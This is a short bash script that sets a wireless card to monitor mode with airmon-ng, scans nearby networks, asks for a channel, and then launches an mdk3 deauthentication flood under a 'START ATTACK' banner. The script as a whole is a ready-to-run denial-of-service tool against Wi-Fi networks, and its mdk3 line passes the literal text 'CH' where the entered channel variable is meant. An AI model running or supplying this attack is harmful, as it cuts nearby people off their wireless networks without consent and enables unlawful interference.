#!/bin/bash

red="\e[0;91m"
blue="\e[0;94m"
reset="\e[0m"
echo ' '
read -p '[?] Enter name interface : ' Interface

MON=mon

airmon-ng start $Interface

airodump-ng $Interface$MON
echo ' '
read -p '[?] Enter CH : ' CH

airmon-ng start $Interface$MON $CH
echo ' '
echo -en "$blue------------------$reset"
echo -en "$red   START ATTACK   $reset"
echo -en "$blue------------------$reset"

mdk3 $Interface$MON d -c CH

airmon-ng stop $Interface$MON
